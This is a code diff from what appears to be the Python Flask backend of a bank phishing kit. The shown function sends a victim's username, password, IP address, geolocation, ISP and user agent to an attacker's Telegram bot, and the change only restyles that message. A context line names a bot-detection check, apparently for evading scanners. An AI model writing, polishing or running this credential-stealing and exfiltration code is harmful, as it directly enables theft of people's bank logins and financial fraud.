@@ -72,29 +72,25 @@ def is_likely_bot(username, password, ip):
     return False
 
 
-# ---------- Telegram ----------
 def send_to_telegram(username, password):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         print("⚠️ Telegram not configured")
         return
 
-   message = (
-    "====================\n"
-    f"{BANK_NAME}\n"
-    "++++++++++++++++++++\n"
-    f"{date}\n"
-    f"domain: {domain}\n"
-    f"{country}|{region}|{city}|{lang}|{isp}|\n"
-    f"ip: {ip}\n"
-    f"ua: {user_agent}\n"
-    "\n"
-    f"Username : {username}\n"
-    f"Password : {password}\n"
-    "\n"
-    "\n"
-    "++++++++++++++++++++\n"
-    "===================="
-)
+    message = (
+        f"🏦 {BANK_NAME}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📅 {date}\n"
+        f"🌐 {domain}\n"
+        f"📍 {country} | {region} | {city}\n"
+        f"🗣 {lang} | 📡 {isp}\n"
+        f"🖥 IP: {ip}\n"
+        f"🧭 UA: {user_agent}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 Username: {username or '(empty)'}\n"
+        f"🔑 Password: {password or '(empty)'}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = urllib.parse.urlencode({
@@ -109,7 +105,6 @@ def send_to_telegram(username, password):
         print(f"📨 Telegram sent: {username}")
     except Exception as e:
         print(f"❌ Telegram error: {e}")
-
 
 # ---------- Routes ----------
 @app.route("/", methods=["GET"])
